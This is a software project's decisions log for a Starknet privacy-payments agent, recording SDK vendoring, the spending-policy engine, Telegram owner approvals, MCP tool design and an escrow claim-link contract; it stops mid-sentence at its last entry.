# Decisions log (ADR-lite)

- D-001 (revised, see D-007): Discovery via ContractDiscoveryProvider (no indexer dependency). Revisit if too slow.
- D-002 (planned): SDK route for agent spending; Wallet API (Ready) only for owner onboarding. Gate G1 fallback: wallet-cosigned mode.
- D-003 (revised, see D-012): SQLite for policy state — single-node, transactional, zero-ops.
- D-004 (open): mainnet proving URL — requested via starkience/strk20-hackathon#147 (Aug 21); awaiting reply. Registration applied upstream as 826bf64 (PR #146).

---

## Day 1 (Aug 21, 2026) — Phase S spike

Source of truth for everything below: the SDK monorepo at `starkware-libs/starknet-privacy`
commit `36eac4ea88cd8c59dde1493176e16501c6e90328`, package version **0.14.3-rc.5**.
Where the SDK's own types contradict `docs/strk20-notes.md` or the SDK README, the **types win**
— both prose sources carry stale examples (details in D-008).

### D-005 — SDK obtained by building the public monorepo, not from GitHub Packages ✅ RESOLVED 2026-08-21

**Blocked:** `pnpm add @starkware-libs/starknet-privacy-sdk` fails with

```
npm error 403 Forbidden - GET https://npm.pkg.github.com/@starkware-libs%2fstarknet-privacy-sdk
npm error Permission permission_denied: The token provided does not match expected scopes.
```

The local `gh` token has scopes `gist, read:org, repo, workflow` — **`read:packages` is missing**.
`docs/strk20-notes.md` §1 names the fix (`gh auth refresh -h github.com -s read:packages`) but that
is an interactive device-flow, so it is an **owner action**.

**Decision:** unblock locally without weakening the install. The SDK monorepo is public (Apache 2.0),
so we cloned it, ran `npm ci && npm run build` in `sdk/`, `npm pack`ed the result, and installed the
tarball from a **gitignored** `vendor/` directory. No `--force`, no skipped integrity checks — the
artefact is the SDK's own build output.

**Reproducibility:** `./scripts/vendor-sdk.sh` rebuilds the identical tarball from the pinned
commit, so `pnpm install` works on a fresh clone without the scope. The lockfile references
`vendor/…tgz`, which is gitignored — run that script first on a clean checkout.

**Revert condition:** as soon as the `read:packages` scope exists, swap the `file:` specifier in
`package.json` and `packages/core/package.json` back to a registry version and delete `vendor/`.
The vendored tarball is deliberately **not committed** so the repo never ships a pre-release build.

### D-006 — Three proving modes, so the flow stays testable while proving is blocked

`PROVING_SERVICE_URL` is unknown (D-004), and a private transfer cannot land on-chain without a real
STARK proof. Rather than fake a proof, the smoke test uses the two mock paths the SDK **already
supports**, and keeps them as first-class modes:

| `--mode` | Chain | Proofs | Submits | Answers |
|---|---|---|---|---|
| `mock` | none (in-memory `Mocknet`) | `MockProofProvider` | applies to mock pool | Is our *flow choreography* right? |
| `simulate` | live Sepolia | SDK's internal mock prover via `.simulate({ node })` | no | Is our *wiring against the live pool* right? |
| `service` | live Sepolia | real proving service | yes | Gate G1 proper |

This is not a workaround we invented: `simulate()` is the SDK's documented fee-estimation path and
runs the full compile pipeline (discovery → note selection → calldata) against real pool state.

### D-007 — `ContractDiscoveryProvider` ships from the `/testing` subpath (revises D-001)

D-001 chose `ContractDiscoveryProvider` as our default to avoid an indexer dependency. The SDK
exports it from **`@starkware-libs/starknet-privacy-sdk/testing`**, not the package entry point, and
its README calls it "best for development and testing"; `IndexerDiscoveryProvider` is the documented
production choice. It also takes a **pool contract object**, not an address.

**Decision:** keep it for Phase S (no external dependency beats production-shaped for a spike), but
D-001 is no longer safe to carry into production unexamined. `packages/core` already prefers
`IndexerDiscoveryProvider` whenever `INDEXER_URL` is set. **Re-decide before Phase M** — shipping a
mainnet product on a provider the vendor labels "for testing" is a judging risk as well as a
technical one.

### D-008 — Corrections to docs/strk20-notes.md, verified against SDK types

Logged per CLAUDE.md ("where its plan conflicts with the notes, log the conflict"). Here the
conflict is with the notes themselves; `docs/strk20-notes.md` has been amended.

1. **`ContractDiscoveryProvider` import path and argument** — see D-007. Notes §2 implied the package
   entry point and an address.
2. **The 10-block rule also covers transparent transactions.** Notes §4 framed it as note maturity
   only. Per the SDK README, any on-chain state the proof reads must be ≥10 blocks old — including
   an account's `deploy` before `register()`, and an ERC-20 top-up before `deposit()`. This is a
   real sequencing hazard for the agent: a burst payer that shields and immediately spends will fail.
   (Reinforces why `packages/core/src/notes.ts` matters.)
3. **Submission shape.** `execute()` returns `{ callAndProof, registry, warnings }`; the caller
   submits with `account.execute(callAndProof.call, { tip: 0n, proofFacts: …proof.proofFacts,
   proof: …proof.data })`. `tip: 0n` confirmed mandatory.
4. **Stale README examples (not the notes' fault, but worth pinning).** The SDK README shows
   `simulate({ provider })` — the type is `{ node }`; and a JSDoc example shows `deposit(100n)` —
   the type is `deposit({ amount })`. Trust `dist/interfaces.d.ts`.
5. **`ContractDiscoveryProvider` needs a *typed* pool contract.** It calls the pool's view methods
   by name (`get_public_key`, `get_note`, `channel_exists`, …), so it wants
   `new Contract({ abi: PrivacyPoolABI, address, providerOrAccount }).typedv2(PrivacyPoolABI)` —
   the ABI is exported from the `/abi` subpath. A generic `{ call() }` shim typechecks through a
   cast and then dies at runtime on the first view call; that is exactly what happened on the first
   live run.
6. **`simulate()` still needs a proving provider.** It builds its own `CallMockProofProvider`
   internally and never calls `prove()` on the configured one — but `createProofInvocation()` asks
   the configured provider for `getDefaultDetails()` (pool nonce, chainId) while compiling. Pass
   `new CallMockProofProvider(node, chainId)` in simulate mode; a stub that throws on every method
   will fail at compile time, not proving time.
7. **Not a correction:** notes §2's `provingProvider: { url, chainId }` is valid. The factory accepts
   `ProofProviderInterface | ProofProviderConfig` and builds the production provider from a config.

### D-009 — Gate G1 status at end of Day 1: **PARTIAL / open — do not pivot**

Evidence (`smoke-report*.json`; reproduce with `pnpm smoke:mock` / `pnpm smoke:simulate`).

**`--mode=mock`: 7/7 steps pass.** register (both parties) → shield → discoverNotes → private
transfer → *recipient-side note verification* → withdraw. Builder chains, channel setup and note
handling are correct.

**`--mode=simulate`: runs against the live Sepolia pool with the real signer.** Preflight fully
green — RPC (spec `0.10.3-rc.0`), pool `0x0254a6…0d91`, STRK token, account
`0x76bdc7…4062` deployed and funded (2999.94 STRK), `provingBlockId = head − 10`. Then:

| Step | Result |
|---|---|
| `discoverRequirement` | `Register (0)` — the live pool correctly reports our fresh account as unregistered |
| `discoverNotes` | 0 notes — correct, nothing shielded yet |
| `shield (simulated)` | **56 felts of `apply_actions` calldata, node-simulated, ~670 ms** |
| `private transfer`, `withdraw` | *not applicable* — see below |

The shield simulation is the strongest signal available today: `CallMockProofProvider` runs the
invocation through the node's transaction simulation and captures what the pool would have emitted.
The pool contract really executed our calldata.

The two spending steps are **not applicable, not broken**. `simulate()` does not mutate state, so
the shield above created nothing on-chain, and there are no notes to spend. Landing a real deposit
needs a real STARK proof — every pool transaction goes through `apply_actions` with `proof` +
`proofFacts`, and a mock proof will not verify on-chain. So this is precisely the ceiling of what is
reachable without the proving service; the script reports it as a skip with a reason rather than a
red failure.

**Blocked, precisely:**

| What | Owner | Status |
|---|---|---|
| Sepolia signer | Enes | ✅ **cleared** — generated by `pnpm keys:gen`, deployed in `0x300f9d…4ba1` |
| `PROVING_SERVICE_URL_SEPOLIA` | upstream | ⛔ open — strk20-hackathon#147 |
| `read:packages` scope (D-005) | Enes | ⛔ open — `gh auth refresh -h github.com -s read:packages` |

**Nothing failed for a reason inside our control**, which is the distinction G1 turns on. Two real
bugs were found by running rather than by reading, and both are fixed:

1. A deposit needs `autoSetup: true` — a note cannot be created before its **token subchannel**
   exists. The mock pool's `Token <n> does not exist` is a *subchannel* assertion, not a missing
   ERC-20.
2. `ContractDiscoveryProvider` needs a typed pool `Contract`, not a `{ call() }` shim (D-008.5).
   This only surfaced against the live chain — mock mode passes either way, because `Mocknet`
   supplies its own pool object.

**Therefore G1 stays open.** PLAN.md's trigger for the Wallet-API fallback is "still red by end of
Day 3", and red means *our* code fails — not that a third party has not replied. `pnpm smoke:sepolia`
is wired and waiting; that run, not this one, decides G1.

### D-010 — Sepolia signer is generated by tooling, not by hand

The live run needs an `ACCOUNT_ADDRESS` / `ACCOUNT_PRIVATE_KEY` / `VIEWING_KEY` triple, and doing
that by hand is four fiddly steps. `scripts/gen-smoke-keys.ts` (`pnpm keys:gen`) does the two
mechanical ones and leaves the two that are genuinely the owner's.

Constraints it encodes, all of which are easy to get wrong by hand:

- **Viewing key range is `[1, MAX_VIEWING_KEY]` where `MAX_VIEWING_KEY = CURVE.n / 2`** — *half* the
  curve order. `randomPrivateKey()` overshoots roughly half the time, so the script uses rejection
  sampling (a modulus would skew the distribution, and this is key material). `resolveSigner` now
  rejects out-of-range keys too, turning a confusing failure deep inside the SDK into a config error.
- **Keys are written directly into `.env` and never printed.** Only the public account address
  reaches stdout — so the secrets never enter an agent transcript, by construction (hard rule 1).
- **Sepolia only.** Refuses to run when `KESE_NETWORK=mainnet`; mainnet key custody is the owner's.
- **Counterfactual address**, derived from the public key, so the account can be funded before it is
  deployed. The OpenZeppelin account class `0x061dac0…71b8f` is already declared on Sepolia
  (verified via `starknet_getClass`; its ABI confirms a single `public_key` constructor arg), so no
  declare step is needed.
- **Refuses to overwrite an existing signer** without `--force` — the old account may hold funds.

This account is a hot test key holding faucet funds. It is not to be reused anywhere real.

---

## Day 2 (Aug 21, 2026) — Phase A, policy core

### D-011 — A cap is an absolute ceiling, not a prompt

*Owner decision.* When an amount exceeds `perTxCap` or `dailyCap`, the engine **denies outright and
never raises an approval request**. The approval threshold only operates in the band *below* the
cap: under `approvalThreshold` → allow; between threshold and cap → ask a human; above the cap →
deny, full stop.

Rejected alternative: let a human approve past the cap. It reads as flexible, but it turns the cap
into a suggestion, and it hands a compromised agent an attack: fire large payments until a tired
owner taps Approve. A limit that can be talked past is not a limit. If a genuinely large payment is
needed, editing the policy is the right amount of friction — it is a deliberate act, not a
notification tapped at midnight.

Consequence for Phase B: the Telegram message never has to say "this is over your cap, approve
anyway?" — the only approvals that reach a human are ones the policy already considers legitimate.

### D-012 — `node:sqlite` instead of better-sqlite3 (revises D-003)

Node 24 ships `node:sqlite` (`DatabaseSync`) in core, verified working on v24.19.0. D-003 named
better-sqlite3, which is a native module needing node-gyp or a prebuilt binary.

**Decision:** use the built-in. Same synchronous, transactional API; one fewer dependency; nothing
to compile — which matters more than usual here, since we are already carrying one install
workaround (D-005) and the judges will run `pnpm install` on an unknown machine.

Two schema choices worth recording:

- **Amounts are `TEXT`, not `INTEGER`.** Token amounts run at 10^18, far past
  `Number.MAX_SAFE_INTEGER`. They are summed in JS as `bigint`; a SQL `SUM()` over these would
  coerce to float and lose precision — in a spending limit, of all places.
- **The store is synchronous throughout, deliberately.** The reserve path reads the rolling window
  and writes a reservation, and those must not interleave (hard rule 5). A synchronous body cannot
  be interrupted by the event loop, and `BEGIN IMMEDIATE` extends that to a second process. Adding
  an `await` inside a transaction would silently reopen the race — noted in the file header so it
  survives a future refactor.

### D-013 — Phase A acceptance: what the 44 policy tests actually pin down

`decide()` is deterministic and fully under test. Beyond the obvious cap/allowlist cases, the suite
pins three things that are easy to get wrong and invisible when wrong:

1. **Concurrency.** Ten parallel `decide()` calls against a cap that fits two grant exactly two.
   This passed the first time it ran, which is the point of writing it: it proves the
   synchronous-transaction design, rather than assuming it.
2. **Idempotency in the dangerous direction.** A replayed key returns the original decision *and*
   the original reservation. A key reused with a **different** request (bigger amount, different
   recipient) is denied — returning the stored `allow` there would authorise a payment nobody
   evaluated. Requests are fingerprinted by normalized content, so re-writing an address in padded
   form is not mistaken for a different request.
3. **Fail-closed on malformed input.** Address parsing throws on a hallucinated address; that
   exception used to escape `decide()`. A crash is not a denial, so every address now parses
   through `tryNormalizeAddress` and a bad one becomes `invalid_request`. Found by a test fixture
   using a non-hex "cute" address — worth keeping.

Also fixed along the way: config was looked up by string key, so a zero-padded token address fell
through to `token_not_configured` — a confusing denial for a token that *is* configured. Both the
allowlist and the cap lookups now compare addresses numerically.

---

## Intel triage — upstream issue #121 (Aug 21, 2026)

Three claims arrived from #121. Verified where verifiable rather than adopted on trust; one was
half-right, one is unverifiable but actionable, one we are deliberately not acting on.

### D-014 — `ContractDiscoveryProvider` IS exported — from `/testing`, not the package entry

**Claim:** "not exported in the published SDK (v0.14.3-rc.5); implement contract-based discovery
ourselves or abstract behind an interface."

**Verdict: half right — correct observation, wrong conclusion. No workaround needed.**

Checked against the actual published release commit `66e3caa`
(`chore(sdk): release 0.14.3-rc.5 (#943)`), not just our working copy:

| Import path | Present at rc.5 |
|---|---|
| `@starkware-libs/starknet-privacy-sdk` | **no** — 0 matches in `src/index.ts` |
| `@starkware-libs/starknet-privacy-sdk/testing` | **yes** — `src/testing/index.ts:35` |

`dist/testing/` ships in the tarball (`files: ["dist"]`, `exports["./testing"]`), and we already
use it against the **live Sepolia pool**: `pnpm smoke:simulate` returns `discoverRequirement →
Register (0)` and simulates a shield into 56 felts of `apply_actions`. Anyone importing from the
package root would see exactly what #121 saw. This is D-007, already logged — the standing action
is not to build a replacement but to re-decide before mainnet, since the vendor labels that subpath
dev/testing.

**However, #121 was right that something was wrong — just not this.** Chasing it exposed a real
defect in our own Phase S work.

### D-015 — Our vendored SDK was main HEAD, not the released rc.5 (fixed)

`scripts/vendor-sdk.sh` pinned `36eac4e`, which was main HEAD at clone time — **8 days and several
commits past** the rc.5 release. Its `package.json` still reads `0.14.3-rc.5` while its CHANGELOG
carries an `## Unreleased` section above it, so the artefact was labelled rc.5 and was not rc.5.

Not cosmetic: `src/internal/abi.ts` differs by 38 lines between the two — that is `PrivacyPoolABI`,
the ABI we build the typed pool `Contract` from. Post-rc.5 it gained open-note screening policies
and **retired the depositor block list**. Building a client ABI ahead of the deployed pool is how
you ship a call that compiles and then reverts.

**Fixed:** the script now pins `66e3caa`, the release commit, with the reasoning in a comment so
the next bump is deliberate. Verified after rebuilding: `get_open_note_screening_policy` is absent
from `PoolContractInterface` (it is a post-rc.5 addition), and all 71 tests, both typechecks and
both smoke modes stay green on the downgrade.

**Standing lesson:** vendoring pins a *commit*, and "latest main" is not "the version in
package.json". This is a second, independent reason to get `read:packages` and install the real
published tarball (D-005) — then there is nothing to get wrong.

### D-016 — ~24 STRK proving reserve: unverified, but guarded

**Claim:** proving transactions need roughly 24 STRK beyond `estimateInvokeFee`.

**Verdict: cannot verify** — it needs a proving service (#147), and it is second-hand. Adopting the
number as fact would be guessing; ignoring it would mean an agent that dies mid-burst with a raw
RPC revert.

**Built the guard, labelled the number.** `packages/core/src/fees.ts` exposes
`assessGasHeadroom()` with `DEFAULT_PROVING_GAS_RESERVE_STRK = 24 STRK`, overridable via
`PROVING_GAS_RESERVE_STRK` (0 disables). The smoke preflight now reports it:

```
✅ Gas headroom (STRK)   2999.9428 held, 24.1000 required (reserve 24.0000, unverified — #121)
```

The case worth testing is when the payment token *is* the gas token: reserve and amount compete for
the same balance, and checking them separately is what silently under-funds a burst. Six tests,
written first. Revise the constant once a real proof has actually been paid for.

**Funding consequence:** a mainnet signer needs the reserve on top of the amount to be shielded —
factor it into Phase M funding rather than discovering it at 2am on Day 8.

### D-017 — Alpha-sepolia endpoints from the app bundle: not adopted

**Claim:** proving/discovery endpoints for alpha-sepolia appear in the official app's JS bundle,
open CORS, usable status unconfirmed.

**Decision: do not hunt for them, do not hardcode them, and do not use them without the team
saying so.** Three reasons, in order of weight: their status is unconfirmed, so a green run against
them would prove nothing we could rely on; they are internal endpoints found by reading someone's
bundle, and the sanctioned channel for exactly this request (#147) is already open with our name on
it; and the team that operates them is the team judging the hackathon.

**No code change is needed to stay ready.** `PROVING_SERVICE_URL_SEPOLIA` is already an env var
resolved through `packages/core/src/config.ts` — if the team confirms a URL on #147 or #121, it is
a one-line `.env` edit and `pnpm smoke:sepolia` runs. Nothing is hardcoded today and nothing should
become hardcoded.

**Owner action:** if you want this unblocked sooner, ask on #147 whether the alpha-sepolia prover is
usable by hackathon teams. That is a question for you to ask, not for us to answer by pointing our
client at it.

### D-018 — MCP tool names are prefixed `kese_` (deviates from PLAN.md)

`PLAN.md` names the tools `get_balance`, `pay_private`, `withdraw`, … The Anthropic mcp-builder
skill calls for a service prefix, and here that is a safety argument rather than a style one: an
agent usually has several MCP servers connected, and a bare `withdraw` or `get_balance` is ambiguous
across them. The model resolves that ambiguity by guessing, and for a money tool a wrong guess moves
funds through the wrong wallet.

Shipped as `kese_pay_private`, `kese_withdraw`, `kese_get_balance`, `kese_create_claim_link`,
`kese_list_activity`, `kese_get_policy`. Reverting is a one-line change if the owner prefers the
original names.

### D-019 — Tool amounts are whole-token decimal strings, never base units

`amount: "1.5"` means 1.5 STRK. Asking a model to write `1500000000000000000` invites an
off-by-10^18, and the direction that survives is the one that **overpays** — only the caps would
stand in the way. The string is parsed as text (never through `Number`, where `0.1 * 1e18` is not
10^17) and scaled once, at the tool boundary. Scientific notation is rejected by the schema.

### D-020 — Execution idempotency is separate from decision idempotency

The policy engine makes `decide()` idempotent: a replayed key returns the original decision *and*
the original reservation. That alone is not enough — the caller would then execute the payment a
second time, since the reservation looks perfectly valid.

`spend()` therefore reads `reservationOutcome(reservationId)` before executing: `committed` returns
the stored receipt verbatim (`replayed: true`), `released` reports the earlier failure rather than
quietly retrying. Hard rule 3 is about execution, not just about deciding — and the gap between the
two is exactly where a double payment lives.

### D-021 — Two build defects found by actually running the server

Neither showed up in tests or typechecks, which is the point of running the thing:

1. **`outDir` lived in `tsconfig.base.json`**, and TypeScript resolves it relative to the file that
   declares it — so every package emitted into the repo root's `dist/`, each overwriting the last.
2. **`paths` in the shared base** made every downstream package compile `@kese/core`'s *source*
   rather than consume its build, which broke `rootDir` and would have shipped duplicate output.
   Package builds now resolve `@kese/core` through node_modules to `dist`; pnpm orders them
   correctly because the workspace dependency is declared. The path mapping survives only in
   `tsconfig.scripts.json` and `vitest.config.ts`, where source resolution is what is wanted.

### D-022 — Approvals: the owner check is the whole security model

A bot token identifies the *bot*, not a person. Anyone who learns the bot's handle can message it,
and a Telegram callback carries whatever chat it came from. Approving because "a callback arrived"
would hand payment authority to a stranger, so `callback_query.from.id` is compared against
`TELEGRAM_OWNER_CHAT_ID` on **every** update, before anything else is read.

Everything that is not an explicit owner approval denies: timeout, unknown ticket, duplicate press
on a resolved ticket, a send that never reached Telegram, a transport error. Silence is never
consent (hard rule 4). A failed *poll*, by contrast, keeps looping — that is a network blip, and
giving up there would strand every pending request; the timeout is what bounds the wait.

**Half-configured is treated as unconfigured.** A bot token with no owner chat id returns no channel
at all, because there is no safe chat to fall back to. No channel means every approval is denied,
never auto-approved — and the server says so loudly at startup.

**No dependency.** Telegram's Bot API is four HTTPS calls and Node 24 ships `fetch`. The project
already carries one dependency workaround (D-005); fewer moving parts in the path that authorises
payments is worth more than the convenience of a client library.

### D-023 — Restart recovery: the reservation outlives the promise

A restart mid-approval loses the promise `spend()` was awaiting, but **not** the policy reservation
that approval was holding. That budget would then stay held until the rolling 24h window slid past
it — invisibly, because nothing failed and nothing logged.

Tickets are therefore persisted with their `reservationId`, and the MCP server releases every
still-pending reservation at startup before serving a single tool. This is the reason the ticket
record exists at all; the audit history is a side benefit.

### D-024 — The runtime policy database was committed by mistake (fixed)

`kese-policy.sqlite` and its WAL files were swept into commit `2f59617` by a `git add -A`. It is
runtime state — a log of what the agent tried to spend — and has no business in the repository.
Untracked and added to `.gitignore` (`*.sqlite*`).

Two follow-ons: a unit test was constructing an approval store at the default `POLICY_DB_PATH` and
so writing to the operator's real database, now pinned to `:memory:`; and `git add -A` is the habit
that caused this, so prefer explicit paths when the working tree has untracked runtime files.

### D-025 — `simulated` is its own outcome, never reported as `paid`

Found while preparing the Telegram dry run, before it could mislead anyone. `spend()` treated any
non-`failed` receipt as success, so in simulate mode — the mode we are stuck in until #147 — a
payment that was compiled but **never submitted** came back as `status: "paid"`. An LLM told a
payment succeeded goes on to tell the user the invoice is settled. A dry run that lies is worse than
no dry run at all.

`simulated` is now a distinct outcome carrying an explicit "NOT submitted" reason, and it
**releases** its reservation: nothing moved, so holding the budget would make the caps drift away
from reality every time someone rehearses.

Worth noting how it surfaced — not from a test or a typecheck, but from asking "what will the owner
actually see when they run this?" before running it.

### D-026 — Approval messages are plain text, and "unreachable" is not "denied"

The first live Telegram dry run refused the payment and reported *"the owner denied this payment"*.
The owner had seen nothing at all. Two separate defects, both found only by running it against the
real API with a real phone:

**1. `parse_mode: "Markdown"` on data we do not control.** Telegram replied
`can't parse entities: Can't find end of the entity starting at byte offset 40` — byte 40 was the
underscore in `private_transfer`. Legacy Markdown reads `_` as italic, finds no closing one, and
rejects the *entire* message. An approval message carries action names, addresses and amounts that
we never get to sanitise, so any formatting mode is a liability: bold text is not worth a broken
approval. Now sent as plain text, with a regression test using the exact string that broke it.

**2. A failed send was reported as a denial.** `request()` returned `"denied"` when `sendMessage`
threw, and the spend pipeline rendered that as "the owner denied this payment". Both outcomes refuse
the payment, but only one is true — and the false one sends the operator hunting for a person who
never received anything, while a broken integration hides behind a plausible-looking policy outcome.
`ApprovalVerdict` gained `"unreachable"`, reported as *"the approval request could not be delivered,
so the owner was never asked"*.

The pattern is the same one D-025 caught an hour earlier, and worth naming: **the failure modes that
matter most here are the ones that produce a confident, wrong answer.** A crash is loud. "Paid" when
nothing was submitted, or "the owner denied" when the owner never saw it, are quiet — and both were
found by asking what a human would actually see, not by a test.

### D-027 — The approval message is the product surface that matters most

The dry run worked: message delivered, buttons shown, Deny pressed, message edited to "🚫 Denied",
payment refused in 25.4s. But the screenshot showed the message itself reading:

```
private_transfer of 60000000000000000000 (token 0x04718f5a0fc34cc1af16a1cdee98ffb20c31f5cd61d6ab07201858f4287c938d) to 0x0b0b
Daily budget left after this: 440000000000000000000 (base units)
```

Every other boundary in Kese already speaks whole tokens — the MCP tool schemas (D-019), the policy
config file. The one boundary with an actual **human** on the other side, deciding in seconds on a
phone with two buttons under it, was the one still speaking base units. Counting twenty digits to
tell 60 STRK from 600 STRK is not a decision, it is a coin flip.

Formatting now lives in `@kese/core/format` (`describeAmount` → `"60 STRK"`), shared with the MCP
server rather than duplicated, and unknown tokens shorten to `0x04718f…938d` instead of dumping 66
characters into a notification.

**Second defect in the same screenshot:** the owner pressed Deny and the outcome came back
`code: approval_unavailable`. The approval was entirely available and the owner used it. Denial
codes now distinguish `owner_denied` (a person said no), `approval_timeout` (nobody answered) and
`approval_unavailable` (we never reached a person) — three different things to go and investigate.

That is the fourth defect of this shape in one session (D-025, D-026 ×2, D-027 ×2). None was a
crash; every one was a confident, wrong answer, and every one was found by looking at what a human
actually sees rather than by a test. Worth carrying into Phase C: **run it, then read it.**

---

## Phase C (Aug 21, 2026) — the escrow claim-link

### D-028 — Mutation testing, because the contract was not written test-first

The Cairo contract was written before its tests — not TDD, and 17 of 17 passed on the first run,
which proves nothing about whether they can catch anything. So each security guarantee was
deliberately broken in the contract to confirm a test goes red:

| Mutation | Result |
|---|---|
| caller-is-pool check removed | ✅ test failed |
| refund-secret check removed | ✅ test failed |
| deposit funding check removed | ✅ test failed |
| domain separation removed (both tags identical) | ❌ **test still passed** |

The fourth test was measuring nothing. It computed the stored refund hash with *its own* copy of
the tag constant, so mutating the contract's constant simply made the two disagree — and it failed
for the same reason the "wrong secret" test already covers. Replaced with one that deposits a
refund commitment built under the **claim** tag: if the contract hashed the refund preimage under
that same tag it would match, so the test only passes while the two domains really are separate.
It kills the mutation.

Chasing it also corrected the contract's own comment, which claimed more than the code delivers —
see D-029.

### D-029 — What domain separation does not buy

The first version of the module doc said different tags mean "a claim secret can never be replayed
as a refund secret". That is wrong. The tags are **public constants**, so a payer who uses one
secret for both roles lets the recipient derive the refund commitment too — different tags make the
two hashes differ, they cannot make a reused secret safe.

What is actually true: the tags put the two preimages in disjoint hash spaces, so neither commitment
can be mistaken for the other. The contract additionally rejects the degenerate case where both
commitments are literally equal. **Genuinely independent secrets are an invariant of whoever
generates them** — enforced in `packages/core/src/claimlink.ts` and tested there, because the
contract structurally cannot check it: it only ever sees hashes.

### D-030 — The refund problem the reference never had to solve

The reference escrow has no refund: an unclaimed payment is locked forever. Adding one runs into a
constraint that is the whole point of the pool — **the escrow cannot see who is asking.** Every call
arrives from the privacy contract, so `get_caller_address()` is the pool, never the payer. A refund
keyed on "the payer asked" is unimplementable; one keyed on the commitment hash alone would let
anyone who reads the chain refund a stranger's escrow into their own note.

So the payer holds a secret too: a refund commitment kept back while the claim commitment travels in
the link. Claiming proves one preimage, refunding proves the other. Symmetric, needs no identity,
and it is the design contribution of this contract.

Also enforced, and not in the reference: **a deposit must be backed by funds not already promised.**
Each deposit alone can look sufficiently funded while the money is spoken for by an earlier
commitment; without tracking obligations per token, whoever claims last finds nothing left.

### D-031 — Cross-language hash agreement is pinned from both sides

The server builds the commitment in TypeScript; the contract verifies it in Cairo. If
`starknet.js`'s `computePoseidonHashOnElements` and Cairo's `poseidon_hash_span` ever disagree over
the same two felts, **every claim link becomes unclaimable** — and it would present as "wrong
secret", not "wrong hash function".

One constant, `poseidon(CLAIM_TAG, 'claim-secret-abc')`, is now asserted from both sides:
`packages/core/src/claimlink.test.ts` and `contracts/escrow-claim/src/tests.cairo`. Either language
changing its mind breaks one of the two.

### D-032 — Deployed to Sepolia

`0x1ff4c7f216a9e1452e4533e03f926e2b10c7868a085b52c6034bcaa3cf3108`, tx
`0x5752eef95c5932977e91dfa3680d60a7bc1326f69a682535e997cc7a65698d9`. Verified on-chain: calling
`pool()` returns the Sepolia pool address, so the contract's entire access control — its single
constructor argument — is correctly wired.

Deployed with starknet.js rather than `sncast`, because the account was created and deployed with
starknet.js (`pnpm keys:gen`) and a second account configuration would be one more thing to keep in
step. `pnpm escrow:deploy --dry-run` reports what it would do without sending anything, and mainnet
requires an explicit `--i-mean-mainnet`.

Toolchain note: the machine's asdf shims are broken (`exec: asdf: not found`), so the scarb and
snforge binaries are called by absolute path — `pnpm escrow:build` / `pnpm escrow:test` wrap that.
`snforge_scarb_plugin` also needs `allow-prebuilt-plugins`, since it is a Rust proc-macro and there
is no cargo here.

### D-033 — Claim links depend on a pool setting only its governor controls

Found by reading the pool's own Cairo rather than the docs, while checking whether our escrow's
empty `Deposit` return would be rejected. (It is not: `_apply_invoke_and_deposits` guards with
`if !deposits.is_empty()`, so a deposit that credits nobody is fine.)

The consequential part is next to it. When an invoked contract **does** return deposits, the pool
treats that contract as the depositor for screening. In the SDK's unreleased version the default
policy for an unlisted depositor is `Required`, meaning **our escrow's own address becomes the
transaction's screening subject** — and `set_open_note_screening_policy` is `only_app_governor()`.
We could not list ourselves even if we wanted to.

That would hit **both** directions: a claim and a refund each credit an open note, so an escrow the
screener will not attest would leave funds locked with no way out at all.

**Verified against the live chains instead of assuming.** Both pools report `get_version()` = `2.0`,
neither has `get_open_note_screening_policy`, and both still answer
`is_open_note_depositor_blocked` — the older **allow-by-default block list**. Our Sepolia escrow
returns `0x0`: not blocked.

| | Sepolia pool | Mainnet pool |
|---|---|---|
| `get_version()` | `2.0` | `2.0` |
| screening model | block list (allow by default) | block list (allow by default) |
| our escrow blocked? | no | n/a — not deployed there yet |

**So claim links are viable today on both networks**, and the risk is a pool upgrade to the newer
screening model during the sprint. Watch item, not a blocker.

**Owner action, worth asking on #147 alongside the proving question:** when the pool moves to
`OpenNoteScreeningPolicy`, does a hackathon-deployed anonymizer need listing, and who lists it?
Getting the answer now is much cheaper than discovering it on Day 8.

**Fallback if the answer is bad:** the escrow can pay a claimer by plain ERC-20 transfer to a public
address instead of crediting an open note. The claimer loses privacy, the funds stay recoverable,
and it is a contained contract change. PLAN.md's G2 ("cut claim links") stays the last resort.

### D-034 — Compiled output was shadowing the sources, and tests kept passing

`packages/core/src/*.js` and `*.d.ts` were committed in `2f59617` and sat beside the TypeScript
they were built from for about an hour. Node resolves `import "./wallet.js"` to a **real**
`wallet.js` in preference to mapping it to `wallet.ts`, so every one of those modules was being
loaded from a stale build — including `index.js`, which `@kese/core` resolves through.

The tests stayed green throughout, which is the whole problem: nothing failed, so nothing pointed at
it. It surfaced only because a newly added method was "not a function" at runtime while sitting
plainly in the source.

Origin: `tsc` ran once with no `outDir` at all — it had been removed from the shared base (it
resolves relative to the file that declares it, so it was emitting every package into the repo root)
before the per-package ones were added. With no `outDir`, `tsc` emits beside the sources.

Three fixes, because one was not enough:

1. Deleted and untracked; `.gitignore` now covers `packages/*/src/**/*.js` and `.d.ts`.
2. Every package tsconfig sets its own `outDir` **and** `rootDir` — verified that a full
   `pnpm -r build` leaves `src/` clean.
3. `scripts/check-no-shadow.mjs` fails the build if any compiled artifact appears beside a source,
   and `pnpm test` runs it first. A tripwire, because this class of bug is invisible by
   construction: the symptom is code that silently does not run.

**What it cost:** the work committed between `2f59617` and now was correct — all 227 tests pass
against the real sources, and the one failing test was failing *because* of the shadow, not because
of a defect. But that was luck, not process. Anything that had regressed in `@kese/core` during
that hour would have gone unnoticed.

### D-035 — Claim links: what is written down, and in which order

Two secrets per link, with opposite handling:

- The **claim** secret is a bearer token for one payment. Handing it to the recipient is the agent's
  whole job, so it reaches the LLM once — and is stored **nowhere**. A stolen copy of the database
  yields the refund path and never the claim path.
- The **refund** secret is the payer's only route back to the funds after expiry. It persists
  server-side and never appears in a tool result.

**Write order matters.** The refund secret goes into the store *before* the escrow is created. The
other way round, a process that died in between would leave funds locked on-chain with the only key
to them gone — unclaimable and unrefundable, permanently. A stored secret for an escrow that never
materialised is just a dead row.

**A replay cannot re-show the URL.** `claimUrl` is deliberately excluded from the receipt stored
against the reservation, so a retried idempotency key returns `replayed: true` and no link. Hard
rule 7 says shown once, and generating a fresh secret instead would lock a second lot of funds
behind a link nobody asked for. The tool description tells the model this outright, because a model
that assumes it can fetch the link again hands the recipient nothing.

**Withdraw and invoke ride in one pool transaction.** Splitting them would leave a window where the
escrow holds funds it has no commitment for — and the next deposit could claim them as its own
funding, which is exactly what the contract's funding check is there to prevent.

### D-036 — `read:packages` granted; the vendored SDK is gone, and it was byte-identical

The scope is in place and `pnpm install` now pulls `0.14.3-rc.5` from GitHub Packages. `vendor/` is
